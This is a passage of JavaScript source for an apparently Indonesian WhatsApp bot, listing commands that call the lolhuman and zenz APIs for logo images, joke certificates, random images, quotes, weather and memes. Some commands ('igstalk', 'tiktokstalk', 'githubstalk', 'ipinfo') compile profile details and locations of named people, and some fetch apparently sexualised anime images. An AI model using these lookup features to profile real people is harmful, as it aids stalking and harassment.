case '12345pornhub': case '12345marvelstudio': case '12345ninjalogo': case '12345space': case '12345avenger': case '12345glitch': case '12345coolgravity': case '12345wallgravity': case '12345wolflogo': case '12345lionlogo': case '12345marvelstudio': {
                if (!text) throw `*Masukan teks1 teks2*\n _Contoh:_ ${prefix + command} Fazrin Gamteng`
                replay(mess.wait)
                siji = args[0]
                loro = args[1]
                Pajrin.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/textprome2/${command}?apikey=${global.apilol}&text1=${siji}&text2=${loro}` }, caption: `Text pro ${command}` }, { quoted: m })
            }
            break
//1 PHOTO OXY
          case '12345smoke': case '12345romance': case '12345cup2': case '12345shadow': case '12345sandwriting': case '12345coffe': case '12345love': case '12345undergrass': case '12345lovemessage': case '12345burnpaper': case '12345nature3d': case '12345wolfmetal': case '12345summer3d': case '12345woodenboard': case '12345woodheart': case '12345flamming': case '12345fallleaves': case '12345summernature': case '12345goldenrose': case '12345underwater': case '12345carvedwood': case '12345harrypotter': {
                if (!text) throw `*Masukan teks!*\n _Contoh:_ ${prefix + command} Fazrin Gamteng`
                replay(mess.wait)
                Pajrin.sendMessage(m.chat, { image: { url: api('zenz', '/photooxy1/' + command, { text: text }, 'apikey') }, caption: `Photo oxy  ${command}` }, { quoted: m })
            }
          break
//2 PHOTO OXY
case '12345pubg': case '12345battlefield4': case '12345arcade8bit': {
                if (!text) throw `*Masukan teks1 teks2*\n _Contoh:_ ${prefix + command} Fazrin Gamteng`
                replay(mess.wait)
                siji = args[0]
                loro = args[1]
                Pajrin.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/photooxy2/${command}?apikey=${global.apilol}&text1=${siji}&text2=${loro}` }, caption: `Photo oxy ${command}` }, { quoted: m })
            }
            break
case '12345tiktokmaker': {
                if (!text) throw `*Masukan teks1 teks2*\n _Contoh:_ ${prefix + command} Fazrin Gamteng`
                replay(mess.wait)
                siji = args[0]
                loro = args[1]
                Pajrin.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/photooxy2/tiktok?apikey=${global.apilol}&text1=${siji}&text2=${loro}` }, caption: `Photo oxy ${command}` }, { quoted: m })
            }
            break
// EPHOTO 360
case '12345hologram3d': case '12345birthdaycake': case '12345lighttext': case '12345galaxywallpaper': case '12345luxurygold': case '12345activegalaxybat': case '12345textbyname': case '12345starsnight': case '12345aovwallpaper': case '12345pubgmaskot': case '12345mlwallpaper': case '12345anonymhacker': case '12345freefire': case '12345avatardota': case '12345avatarlolnew': case '12345logogaming': {
                if (!text) throw `*Masukan teks!*\n _Contoh:_ ${prefix + command} Fazrin Gamteng`
                replay(mess.wait)
                Pajrin.sendMessage(m.chat, { image: { url: api('zenz', '/ephoto1/' + command, { text: text }, 'apikey') }, caption: `Ephoto 360  ${command}` }, { quoted: m })
            }
          break
//[SERTIFIKAT MENU]\\ With apikey lol human
case '12345ytsilver': {
                if (!text) throw `*Masukan Teks*\n _Contoh:_ ${prefix + command} xZrinva`
                replay(mess.wait)
                Pajrin.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/ephoto1/silverplaybutton?apikey=${global.apilol}&text=${text}` }, caption: `Sertifikat YouTube Silver` }, { quoted: m })
            }
            break
case '12345ytgold': {
                if (!text) throw `*Masukan Teks*\n _Contoh:_ ${prefix + command} xZrinva`
                replay(mess.wait)
                Pajrin.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/ephoto1/goldplaybutton?apikey=${global.apilol}&text=${text}` }, caption: `Sertifikat YouTube Gold` }, { quoted: m })
            }
            break
case '12345tolol': {
                if (!text) throw `*Masukan Nama*\n _Contoh:_ ${prefix + command} Fazrin Mauza`
                replay(mess.wait)
                Pajrin.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/toloserti?apikey=${global.apilol}&name=${text}` }, caption: `Sertifikat Tolol` }, { quoted: m })
            }
            break
case '12345fuckboy': case '12345fuckgirl': {
                if (!text) throw `*Masukan Nama*\n _Contoh:_ ${prefix + command} Fazrin Mauza`
                replay(mess.wait)
                Pajrin.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/${command}?apikey=${global.apilol}&name=${text}` }, caption: `Sertifikat ${command}` }, { quoted: m })
            }
            break
case '12345bucin': {
                if (!text) throw `*Masukan Nama*\n _Contoh:_ ${prefix + command} Fazrin Mauza`
                replay(mess.wait)
                Pajrin.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/bucinserti?apikey=${global.apilol}&name=${text}` }, caption: `Sertifikat Bucin` }, { quoted: m })
            }
            break
case '12345pacar': {
                if (!text) throw `*Masukan nama1 nama2*\n _Contoh:_ ${prefix + command} Fazrin Afita`
                replay(mess.wait)
                nama1 = args[0] 
                nama2 = args[1] 
                Pajrin.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/pacarserti?apikey=${global.apilol}&name1=${nama1}&name2=${nama2}` }, caption: `Sertifikat Pacar` }, { quoted: m })
            }
            break
case '12345goodboy': case '12345goodgirl': case '12345badboy': case '12345badgirl': {
                if (!text) throw `*Masukan Nama*\n _Contoh:_ ${prefix + command} Fazrin Mauza`
                replay(mess.wait)
                Pajrin.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/${command}?apikey=${global.apilol}&name=${text}` }, caption: `Sertifikat ${command}` }, { quoted: m })
            }
            break

//[Random image MENU]\\ With apikey lol human
case '12345rblackpink': {
let buttons = [
                    {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️NEXT➡️'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: `https://api.lolhuman.xyz/api/random/blackpink?apikey=${global.apilol}` },
                    caption: `*〔 Random Image Blackpink〕*`,
                    footer:  `${global.fake}`,
                    buttons: buttons,
                    headerType: 4
                }
                Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
          break
case '12345bts': case '12345exo': case '12345cecan': case '12345cogan': case '12345estetic': case '12345elf': case '12345loli': case '12345neko': case '12345waifu': case '12345shota': case '12345husbu': case '12345sagiri': case '12345elaina': case '12345shinobu': case '12345kanna': case '12345megumin': case '12345art': case '12345wallnime': {
                let buttons = [
                    {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️NEXT➡️'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: `https://api.lolhuman.xyz/api/random/${command}?apikey=${global.apilol}` },
                    caption: `*〔 Random Image ${command} 〕*`,
                    footer:  `${global.fake}`,
                    buttons: buttons,
                    headerType: 4
                }
           //     let encmedia = await Pajrin.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })               
                Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
          break
case '12345neko2': {
let buttons = [
                    {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️NEXT➡️'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: `https://api.lolhuman.xyz/api/random2/neko?apikey=${global.apilol}` },
                    caption: `*〔 Random Image Neko 2 〕*`,
                    footer:  `${global.fake}`,
                    buttons: buttons,
                    headerType: 4
                }
                Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
       }
          break

          case '12345ngif': case '12345feed': case '12345kiss': case '12345smug': case '12345tickle': case '12345cuddle': case '12345fox_girl': {
	m.reply(mess.wait)
	let media = `https://api.lolhuman.xyz/api/random2/${command}?apikey=${global.apilol}`
	let buttons = [
                     {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️Next➡️'}, type: 1}
                ]
                let buttonMessage = {
                    text: `*Reply Sticker dengan caption* ${prefix}togif \n*Untuk mengubah Sticker menjadi GIF*\n\n*Reply Sticker dengan caption* ${prefix}toimg \n*Untuk mengubah Sticker menjadi FOTO*`,
                    footer: `Random ${command}`,
                    buttons: buttons,
                    headerType: 2
                }
                let encmedia = await Pajrin.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })               
                Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
         await fs.unlinkSync(encmedia)
   }
            break
case '12345bully': case '12345cry': case '12345hug': case '12345awoo': case '12345lick': case '12345pat': case '12345bonk': case '12345yeet': case '12345blush': case '12345smile': case '12345wave': case '12345highfive': case '12345handhold': case '12345nom': case '12345bite': case '12345glomp': case '12345kill': case '12345slap': case '12345happy': case '12345wink': case '12345dance': case '12345cringe': {
	m.reply(mess.wait)
	let media = `https://api.lolhuman.xyz/api/random/${command}?apikey=${global.apilol}`
	let buttons = [
                     {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️Next➡️'}, type: 1}
                ]
                let buttonMessage = {
                    text: `*Reply Sticker dengan caption* ${prefix}togif \n*Untuk mengubah Sticker menjadi GIF*\n\n*Reply Sticker dengan caption* ${prefix}toimg \n*Untuk mengubah Sticker menjadi FOTO*`,
                    footer: `Random ${command}`,
                    buttons: buttons,
                    headerType: 2
                }
                let encmedia = await Pajrin.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })               
                Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
         await fs.unlinkSync(encmedia)
   }
            break
            case '12345gasm': {
	m.reply(mess.wait)
	let media = `https://api.lolhuman.xyz/api/random2/${command}?apikey=${global.apilol}`
	let buttons = [
                    {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️NEXT➡️'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: media },
                    caption: `*〔 Random Image ${command} 〕*`,
                    footer:  `${global.fake}`,
                    buttons: buttons,
                    headerType: 4
                }
                let encmedia = await Pajrin.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })               
                Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
         await fs.unlinkSync(encmedia)
   }
            break


//[Random text MENU]\\ With apikey lol human
case '12345copy':{
	m.reply(`${text}`)
	}
	break
case '12345quotes': {
                let anu = await fetchJson(api('zenz', '/random/quotes', {}, 'apikey'))
                quotesnya = anu.result.quote
                quotesby = anu.result.by
                hihi = quotesby
                haha = quotesnya
                    if (args[0] === 'teks') {
						reply(`${haha}`)
              } else {  
                   let buttons = [
                     {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️Next➡️'}, type: 1},
                     {buttonId: `${prefix}copy ${haha}\n\nBy ${hihi}`, buttonText: {displayText: `📄COPY TEKS📄`}, type: 1}
                ]
                let buttonMessage = {
                    text: `${haha}`,
                    footer: `By ${quotesby}`,
                    buttons: buttons,
                    headerType: 2
                }
            Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
                }
            }
            break
 case '12345quotesislami': {
 	let anu = await fetchJson(`https://api.lolhuman.xyz/api/quotes/islami?apikey=${global.apilol}`)
     let buttons = [
                     {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️Next➡️'}, type: 1},
                     {buttonId: `${prefix}copy ${anu.result}`, buttonText: {displayText: `📄COPY TEKS📄`}, type: 1}
                ]
                let buttonMessage = {
                    text: anu.result,
                    footer: `© ${global.botnma} by ${global.ownernma}`,
                    buttons: buttons,
                    headerType: 2
                }
            Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case '12345quotesdilan': {
 	let anu = await fetchJson(`https://api.lolhuman.xyz/api/quotes/dilan?apikey=${global.apilol}`)
     let buttons = [
                     {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️Next➡️'}, type: 1},
                     {buttonId: `${prefix}copy ${anu.result}`, buttonText: {displayText: `📄COPY TEKS📄`}, type: 1}
                ]
                let buttonMessage = {
                    text: anu.result,
                    footer: `By ${global.fake}`,
                    buttons: buttons,
                    headerType: 2
                }
            Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case '12345quotesanime': {
 	let anu = await fetchJson(`https://api.lolhuman.xyz/api/random/quotesnime?apikey=${global.apilol}`)
     let buttons = [
                     {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️Next➡️'}, type: 1},
                     {buttonId: `${prefix}copy ${anu.result.quote}\n\nCharacter: ${anu.result.character}\nAnime: ${anu.result.anime}\nEpisode: ${anu.result.episode}`, buttonText: {displayText: `📄COPY TEKS📄`}, type: 1}
                ]
                let buttonMessage = {
                    text: anu.result.quote,
                    footer: `Character: ${anu.result.character}
Anime: ${anu.result.anime}
Episode: ${anu.result.episode}`,
                    buttons: buttons,
                    headerType: 2
                }
            Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case '12345faktaunik': case '12345pantun': case '12345puisi': case '12345katabucin': {
 	let anu = await fetchJson(`https://api.lolhuman.xyz/api/random/${command}?apikey=${global.apilol}`)
     let buttons = [
                     {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️Next➡️'}, type: 1},
{buttonId: `${prefix}copy ${anu.result}`, buttonText: {displayText: `📄COPY TEKS📄`}, type: 1}                    
                ]
                let buttonMessage = {
                    text: anu.result,
                    footer: `Random ${command}`,
                    buttons: buttons,
                    headerType: 2
                }
            Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case '12345nasihat': {
 	let anu = await fetchJson(`https://api.lolhuman.xyz/api/random/katabijak?apikey=${global.apilol}`)
     let buttons = [
                     {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️Next➡️'}, type: 1},
                     {buttonId: `${prefix}copy ${anu.result}`, buttonText: {displayText: `📄COPY TEKS📄`}, type: 1}
                ]
                let buttonMessage = {
                    text: anu.result,
                    footer: `By ${global.fake}`,
                    buttons: buttons,
                    headerType: 2
                }
            Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case '12345cerpen': {
 	let anu = await fetchJson(`https://api.lolhuman.xyz/api/cerpen?apikey=${global.apilol}`)
     let buttons = [
                     {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️Next➡️'}, type: 1},
                        {buttonId: `${prefix}copy ${anu.result.title}\n\n${anu.result.cerpen}\n\nBy ${anu.result.creator}.`, buttonText: {displayText: `📄COPY TEKS📄`}, type: 1}
                ]
                let buttonMessage = {
                    text: `*${anu.result.title}*

${anu.result.cerpen}`,
                    footer: `By ${anu.result.creator}`,
                    buttons: buttons,
                    headerType: 2
                }
            Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case '12345ceritahoror': {
	let anu = await fetchJson(`https://api.lolhuman.xyz/api/ceritahoror?apikey=${global.apilol}`)        
                let buttons = [
                    {buttonId: `${prefix + command} ${text}`, buttonText: {displayText: '➡️NEXT➡️'}, type: 1},
                       {buttonId: `${prefix}copy ${anu.result.title}\n\n${anu.result.desc}\n\n${anu.result.story}`, buttonText: {displayText: `📄COPY TEKS📄`}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: anu.result.thumbnail},
                    caption: `*〔 ${anu.result.title} 〕*

${anu.result.desc}

${anu.result.story}`,
                    footer:  `${global.fake}`,
                    buttons: buttons,
                    headerType: 4
                }
                Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
          break
//[Informasi MENU]\\ With apikey lol human
case '12345wikipedia': case '12345wiki': {
	if (!text) throw `*Apa yang mau di cari?*\n _Contoh:_ ${prefix + command} wibu`
	let anu = await fetchJson(`https://api.lolhuman.xyz/api/wiki?apikey=${global.apilol}&query=${text}`)
replay(anu.result)
 }
break
            case '12345kbbi': {
            	 if (!text) throw `*Apa yang mau di tanyakan?*\n _Contoh:_ ${prefix + command} sekolah`
 	let anu = await fetchJson(`https://api.lolhuman.xyz/api/kbbi?apikey=${global.apilol}&query=${text}`)
 makn = anu.result
 let result = makn[Math.floor(Math.random() * makn.length)]
 makno = result.makna
 makne = makno[Math.floor(Math.random() * makno.length)]
 let buttons = [
                     {buttonId: `${prefix + command} ${text}`, buttonText: {displayText: '➡️Next➡️'}, type: 1}
                ]
                let buttonMessage = {
                    text: `*〔 KBBI ${result.nama} 〕*

${makne.submakna}`,
                    footer: `Klik NEXT untuk jawaban yang lainnya`,
                    buttons: buttons,
                    headerType: 2
                }
            Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case '12345infogempa': {
	let anu = await fetchJson(`https://api.lolhuman.xyz/api/infogempa?apikey=${global.apilol}`)        
                let buttons = [
                    {buttonId: `${prefix} menu`, buttonText: {displayText: '</Menu'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: anu.result.map},
                    caption: `*〔 Info Gempa 〕*

*LOKASI* : ${anu.result.lokasi}

*WAKTU :* ${anu.result.waktu}

*MAGNITUDE* : ${anu.result.magnitude}

*KEDALAMAN* : ${anu.result.kedalaman}

*POTENSI* : ${anu.result.potensi}`,
                    footer:  `Data berasal dari BMKG`,
                    buttons: buttons,
                    headerType: 4
                }
                Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
          break
case '12345jadwaltvnow': case '12345jadwaltv': case '12345acaratvnow': case '12345acaratv': {
	let anu = await fetchJson(`https://api.lolhuman.xyz/api/jadwaltv/now?apikey=${global.apilol}`)
	una = anu.result
	replay(`*〔 Jadwal TV Now 〕*

*Antv*
${una.antv}
──────────────
*G TV*
${una.gtv}
──────────────
*Indosiar*
${una.indosiar}
──────────────
*Metrotv*
${una.metrotv}
──────────────
*Mnctv*
${una.mnctv}
──────────────
*Rcti*
${una.rcti}
──────────────
*Nettv*
${una.nettv}
──────────────
*Tvone*
${una.tvone}
──────────────
*Transtv*
${una.transtv}
──────────────
*Trans7*
${una.trans7}
──────────────
*Sctv*
${una.sctv}
──────────────
*Rtv*
${una.rtv}
──────────────
*Tvri*
${una.tvri}`)
}
break
case '12345cuaca': case '12345infocuaca': {
	if (!text) throw `*Masukan nama kota/kecamatan*\n _Contoh:_ ${prefix + command} Ngawi`
	let anu = await fetchJson(`https://api.lolhuman.xyz/api/cuaca/${text}?apikey=${global.apilol}`)
	una = anu.result
replay(`*〔 Cuaca di ${una.tempat} 〕*

*⭔ Cuaca :* ${una.cuaca}
*⭔ Angin :* ${una.angin}
*⭔ Description :* ${una.description}
*⭔ Kelembapan :* ${una.kelembapan}
*⭔ Suhu :* ${una.suhu}
*⭔ Udara :* ${una.udara}
*⭔ Permukaan Laut :* ${una.permukaan_laut}
*⭔ Longitude :* ${una.longitude}
*⭔ Latitude :* ${una.latitude}`)
 }
break
case '12345coronaindo': case '12345covidindo': {
	let anu = await fetchJson(`https://api.lolhuman.xyz/api/corona/indonesia?apikey=${global.apilol}`)
	una = anu.result
replay(`*〔 Info Covid-19 Indonesia 〕*

*⭔ Positif :* ${una.positif}
*⭔ Meninggal :* ${una.meninggal}
*⭔ Sembuh :* ${una.sembuh}
*⭔ Dirawat :* ${una.dirawat}`)
 }
break
case '12345corona': case '12345covid': {
	let anu = await fetchJson(`https://api.lolhuman.xyz/api/corona/global?apikey=${global.apilol}`)
	una = anu.result
replay(`*〔 Covid-19 Dunia 〕*

*⭔ Positif :* ${una.positif}
*⭔ Meninggal :* ${una.meninggal}
*⭔ Sembuh :* ${una.sembuh}
*⭔ Dirawat :* ${una.dirawat}`)
 }
break
case '12345jarak': case '12345jaraktempuh': case '12345jarakkota': {
	if (!text) throw `*Masukan nama kota1 kota2*\n _Contoh:_ ${prefix + command} banyuwangi malang`
	tek1 = args[0] 
	tek2 = args[1] 
	let anu = await fetchJson(`https://api.lolhuman.xyz/api/jaraktempuh?apikey=${global.apilol}&kota1=${tek1}&kota2=${tek2}`)
	una = anu.result
replay(`*〔 Jarak Tempuh 〕*
From ${una.from} To ${una.to}

*⭔ Jarak :* ${una.jarak}
*⭔ Kereta Api :* ${una.kereta_api}
*⭔ Pesawat :* ${una.pesawat}
*⭔ Mobil :* ${una.mobil}
*⭔ Motor :* ${una.motor}
*⭔ Jalan Kaki :* ${una.jalan_kaki}
`) }
break
case '12345beasiswa': case '12345infobeasiswa': {
	let anu = await fetchJson(`https://api.lolhuman.xyz/api/indbeasiswa?apikey=${global.apilol}`)
	let una = anu.result
	let result = una[Math.floor(Math.random() * una.length)]
let buttons = [
                     {buttonId: `${prefix + command} ${text}`, buttonText: {displayText: '➡️Next➡️'}, type: 1}
                ]
                let buttonMessage = {
                    text: `*〔 Beasiswa Indonesia 〕*

*${result.title}*
Link: ${result.link}`,
                    footer: `Klik NEXT untuk hasil yang lainnya`,
                    buttons: buttons,
                    headerType: 2
                }
            Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case '12345brainly': case '12345soal': {
	if (!text) throw `*Masukan soal/pertanyaan*\n _Contoh:_ ${prefix + command} orang yang memiliki kewarganegaraan ganda di sebut`
	let anu = await fetchJson(`https://api.lolhuman.xyz/api/brainly?apikey=${global.apilol}&query=${text}`)
	let una = anu.result
	let result = una[Math.floor(Math.random() * una.length)]
	let ini = result.answer
	let hiu = ini[Math.floor(Math.random() * ini.length)]
	let buttons = [
                     {buttonId: `${prefix + command} ${text}`, buttonText: {displayText: '➡️Next➡️'}, type: 1}
                ]
                let buttonMessage = {
                    text: `*〔 Brainly Search 〕*

   *Pertanyaan :*
_${result.question.content}_

   *Jawaban:*
 ${hiu.content}
`,
                    footer: `Klik NEXT untuk hasil yang lainnya`,
                    buttons: buttons,
                    headerType: 2
                }
            Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case '12345jadwalbola': case '12345bolajadwal': {
	let anu = await fetchJson(`https://api.lolhuman.xyz/api/jadwalbola?apikey=${global.apilol}`)
	let una = anu.result
	let result = una[Math.floor(Math.random() * una.length)]
	let buttons = [
                     {buttonId: `${prefix + command} ${text}`, buttonText: {displayText: '➡️Next➡️'}, type: 1}
                ]
                let buttonMessage = {
                    text: `*〔 Jadwal Bola 〕*

*⭔ Hari :* ${result.hari}
*⭔ Jam :* ${result.jam}
*⭔ Event :* ${result.event}
*⭔ Match :* ${result.match}
*⭔ TV :* ${result.tv}`,
                    footer: `Klik NEXT untuk hasil yang lainnya`,
                    buttons: buttons,
                    headerType: 2
                }
            Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case '12345chord': {
	if (!text) throw `*Masukan Judul lagu !*\n _Contoh:_ ${prefix + command} melukis senja`
	let anu = await fetchJson(`https://api.lolhuman.xyz/api/chord?apikey=${global.apilol}&query=${text}`)
	reply(`*〔 Chord Lagu ${text}〕*
	
*⭔ Title :* ${anu.result.title}
*⭔ Created :* ${anu.result.created}
*⭔ Modified :* ${anu.result.modified.username} (${anu.result.modified.first_name} ${anu.result.modified.last_name}
*⭔ Chord :* ${anu.result.chord}`)
}
break
//[Stalk MENU]\\ With apikey lol human
       case '12345igstalk': case '12345stalkig': case '12345instastalk': case '12345instagramstalk': {
       	if (!text) throw `*Masukan username Instagram*\n _Contoh:_ ${prefix + command} fleyvin_soft`
       m.reply(mess.wait)
       	let anu = await fetchJson(`https://api.lolhuman.xyz/api/stalkig/${text}?apikey=${global.apilol}`)
           let foto = anu.result.photo_profile
           let teks = `*〔 Instagram Stalk 〕*

*⭔ Username :* ${anu.result.username}
*⭔ Fullname :* ${anu.result.fullname}
*⭔ Jumlah Post :* ${anu.result.posts}
*⭔ Followers :* ${anu.result.followers}
*⭔ Following :* ${anu.result.following}
*⭔ Bio :* ${anu.result.bio}`
Pajrin.sendMessage(m.chat, { image: { url: foto },  caption: teks , contextInfo:{"externalAdReply": {"title": ` ${global.botnma}`,"body": ` Subscribe Bot's Official YT Channel`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": "https://youtu.be/imFIX-Wrt3s"}}}, { quoted: m})
        }
        break
        case '12345tiktokstalk': case '12345stalktiktok': case '12345ttstalk': case '12345stalktt': {
       	if (!text) throw `*Masukan username Tiktok*\n _Contoh:_ ${prefix + command} fleyvin_soft`
       m.reply(mess.wait)
       	let anu = await fetchJson(`https://api.lolhuman.xyz/api/stalktiktok/${text}?apikey=${global.apilol}`)
           let foto = anu.result.user_picture
           let teks = `*〔 TikTok Stalk 〕*

*⭔ Username :* ${anu.result.username}
*⭔ Nama :* ${anu.result.nickname}
*⭔ Jumlah Video :* ${anu.result.video}
*⭔ Jumlah Like :* ${anu.result.likes}
*⭔ Followers :* ${anu.result.followers}
*⭔ Following :* ${anu.result.followings}
*⭔ Bio :* ${anu.result.bio}`
                  Pajrin.sendMessage(m.chat, { image: { url: foto },  caption: teks , contextInfo:{"externalAdReply": {"title": ` ${global.botnma}`,"body": ` Subscribe Bot's Official YT Channel`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": "https://youtu.be/imFIX-Wrt3s"}}}, { quoted: m})
        }
break
        case '12345twitterstalk': case '12345twitstalk': case '12345stalktwitter':  {
       	if (!text) throw `*Masukan username Twitter*\n _Contoh:_ ${prefix + command} jokowi`
       m.reply(mess.wait)
       	let anu = await fetchJson(`https://api.lolhuman.xyz/api/twitter/${text}?apikey=${global.apilol}`)
           let foto = anu.result.profile_picture
           let teks = `*〔 Twitter Stalk 〕*

*⭔ Username :* ${anu.result.name}
*⭔ Nama :* ${anu.result.screen_name}
*⭔ Deskripsi :* ${anu.result.description}
*⭔ Followers :* ${anu.result.followers}
*⭔ Following :* ${anu.result.following}
*⭔ Tweet :* ${anu.result.tweet}
*⭔ Bergabung :* ${anu.result.joined}`
                  Pajrin.sendMessage(m.chat, { image: { url: foto },  caption: teks , contextInfo:{"externalAdReply": {"title": ` ${global.botnma}`,"body": ` Subscribe Bot's Official YT Channel`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": "https://youtu.be/imFIX-Wrt3s"}}}, { quoted: m})
        }
break
case '12345githubstalk': case '12345stalkgithub': {
       	if (!text) throw `*Masukan username Twitter*\n _Contoh:_ ${prefix + command} fleyvin_soft`
       m.reply(mess.wait)
       	let anu = await fetchJson(`https://api.lolhuman.xyz/api/github/${text}?apikey=${global.apilol}`)
           let foto = anu.result.avatar
           let teks = `*〔 Github Stalk 〕*

*⭔ Nama :* ${anu.result.name}
*⭔ Followers :* ${anu.result.followers}
*⭔ Following :* ${anu.result.following}
*⭔ Bio :* ${anu.result.bio}
*⭔ Publik Repo:* ${anu.result.public_repos}
*⭔ Publik Gist :* ${anu.result.public_gists}
*⭔ Type :* ${anu.result.type}
*⭔ Company :* ${anu.result.company}
*⭔ Location :* ${anu.result.location}
*⭔ Email :* ${anu.result.email}
*⭔ Link :* ${anu.result.url}`
                  Pajrin.sendMessage(m.chat, { image: { url: foto },  caption: teks , contextInfo:{"externalAdReply": {"title": ` ${global.botnma}`,"body": ` Subscribe Bot's Official YT Channel`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./BotMedia/logo.jpg`),"sourceUrl": "https://youtu.be/imFIX-Wrt3s"}}}, { quoted: m})
        } 
break
case '12345youtubestalk': case '12345ytstalk': {
       	if (!text) throw `*Masukan Nama channel YouTube*\n _Contoh:_ ${prefix + command} xZrinva`
       m.reply(mess.wait)
       	let anu = await fetchJson(`https://api.lolhuman.xyz/api/ytchannel?apikey=${global.apilol}&query=${text}`)
           let una = anu.result
           let ini = una[Math.floor(Math.random() * una.length)]
                   images = ini.channel_picture.high.url
        let buttons = [
                    {buttonId: `${prefix + command} ${text}`, buttonText: {displayText: '➡️NEXT➡️'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: images },
                    caption: `*〔 YouTube Stalk 〕*

*⭔ Nama :* ${ini.channel_name}
*⭔ Bio :* ${ini.channel_about}
*⭔ Link :* https://YouTube.com/channel/${ini.channel_id}
`,
                    footer: `Klik NEXT Untuk Hasil Lainnya`,
                    buttons: buttons,
                    headerType: 4
                }
                Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
        }
break
case '12345ip': case '12345ipinfo': case '12345ipaddress':  {
       	if (!text) throw `*Masukan Alamat IP*\n _Contoh:_ ${prefix + command} 114.142.169.38`
       m.reply(mess.wait)
       	let anu = await fetchJson(`https://api.lolhuman.xyz/api/ipaddress/${text}?apikey=${global.apilol}`)          
           replay(`*〔 IP Address 〕*

*⭔ IP Address :* ${anu.result.query}
*⭔ Negara :* ${anu.result.country}
*⭔ Kode Negara :* ${anu.result.countryCode}
*⭔ Region :* ${anu.result.regionName}
*⭔ Region Code :* ${anu.result.region}
*⭔ Kota :* ${anu.result.city}
*⭔ Waktu :* ${anu.result.timezone}
*⭔ Zip :* ${anu.result.zip}
*⭔ Lat :* ${anu.result.lat}
*⭔ Lon :* ${anu.result.lon}
*⭔ Isp :* ${anu.result.isp}
*⭔ Org :* ${anu.result.org}
*⭔ As :* ${anu.result.as}`)               
        }
break
//[MEME MENU]\\ With apikey lol human

case '12345memeindo': {                
                let buttons = [
                    {buttonId: `${prefix + command} ${text}`, buttonText: {displayText: '➡️NEXT➡️'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: `https://api.lolhuman.xyz/api/meme/memeindo?apikey=${global.apilol}` },
                    caption: `*〔 Random Image Meme Indo 〕*`,
                    footer:  `${global.fake}`,
                    buttons: buttons,
                    headerType: 4
                }
                Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
          break
case '12345memeglobal': {                
                let buttons = [
                    {buttonId: `${prefix + command} ${text}`, buttonText: {displayText: '➡️NEXT➡️'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: `https://api.lolhuman.xyz/api/random/meme?apikey=${global.apilol}` },
                    caption: `*〔 Random Image Meme Internasional 〕*`,
                    footer:  `${global.fake}`,
                    buttons: buttons,
                    headerType: 4
                }
                Pajrin.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
          break
case '12345darkjoke': {                
                let buttons = [
                    {buttonId: `${prefix + command} ${text}`, buttonText: {displayText: '➡️NEXT➡️'}, type: 1}
                ]
                let buttonMessage = {
